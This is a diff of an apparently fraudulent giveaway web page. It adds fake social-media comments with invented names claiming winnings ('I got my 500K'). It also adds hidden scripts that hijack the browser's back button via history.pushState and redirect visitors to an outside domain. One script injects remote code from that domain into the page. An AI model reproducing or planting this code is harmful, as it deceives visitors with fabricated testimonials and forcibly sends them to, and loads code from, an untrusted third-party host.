+</span>
+<br/>
+thanks very much CBN
+</p>
+<p class='combot' style='display: block;'>
+<span class='ago'>
+Just now
+</span>
+&#183;
+<span class='fblike'>
+Like
+</span>
+</p>
+</div>
+<div class='item' id='fb5' style='display: none; opacity: 1;'>
+<img class='profileimg' height='50' src='https://i.imgur.com/8tl1B3q.jpg' width='50'/>
+<p class='comtxt' style='display: block;'>
+<span class='name'>
+Rudy Mbondett
+</span>
+<br/>
+Yes! It's just awesome, thanks.
+
+
+
+</p>
+<p class='combot' style='display: block;'>
+<span class='ago'>
+Just now
+
+</span>
+&#183;
+<span class='fblike'>
+Like
+</span>
+</p>
+</div>
+<div class='item' id='fb4' style='display: none; opacity: 1;'>
+<img class='profileimg' height='50' src='https://i.imgur.com/5tpZiak.jpg' width='50'/>
+<p class='comtxt' style='display: block;'>
+<span class='name'>
+David Van Reza
+</span>
+<br/> Yeeess
+
+
+</p>
+<p class='combot' style='display: block;'>
+<span class='ago'>
+Just now
+</span>
+&#183;
+<span class='fblike'>
+Like
+</span>
+</p>
+</div>
+<div class='item'>
+<img class='profileimg' height='50' src='https://blogger.googleusercontent.com/img/a/AVvXsEgOv3XY9bK4Ml52CMIDG7PG7SevkaMBTVq7uI1UweKsDKO7vtXYDk50weKZw5KCW8JH891Yt0kqcOAs1fyyc8JA7Vv-Bt0CCU3NnJgxEdtSKNe48Dle2gN0EBOo0St1o4DRFI0z-fXT3UVc0qRpL67hntqfPlcGIcifFDhP0UpMT66R8hZ4NQg-g4Cjjg=s320' width='50'/>
+<p class='comtxt'>
+<span class='name'>
+Vivian Michael
+
+</span>
+<br/> I got my 500K 
+
+
+
+</p>
+<p class='combot'>
+<span class='ago'>
+Barasan
+</span>
+&#183;
+<span class='fblike'>
+Like
+</span>
+<span class='likes totlikes'>
+112
+</span>
+</p>
+</div>
+</div>
+<br/>
+
+
+
+
+
+
+
+
+<center>
+  <strong> SPONSORED CARD</strong><br/>
+<img src='https://www.cihi.ca/sites/default/files/image/covid-19_resources_masthead-400x400.svg' width='350' />
+
+  </center>
+<div>
+
+
+</body></html>
+<!-- Histats.com START (aync)-->
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,3355942,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+
+  <script>
        window.onhashchange=function(){jp();};  
 function hh1() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}  
 function jp() {
 fh();}
 setTimeout('hh1();', 500);  
 function fh(){
-location.href='https://thaudray.com/4/3153728';
+location.href='https://dooloust.net/4/3153728
 }
             var _hmt = _hmt || [];
             (function() {
@@ -2443,5 +1515,25 @@ location.href='https://thaudray.com/4/3153728';
                 s.parentNode.insertBefore(hm, s);
             })();
         </script>
-	</body>
-</html>
+  <script>
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://dooloust.net/4/3153728";
+    }
+    function goon(){
+        location.href="https://dooloust.net/4/3153728";
+    }
+</script>
+<script>
+    var _hmt = _hmt || [];
+    (function() {
+        var hm = document.createElement("script");
+        hm.src = "https://dooloust.net/4/3153728";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
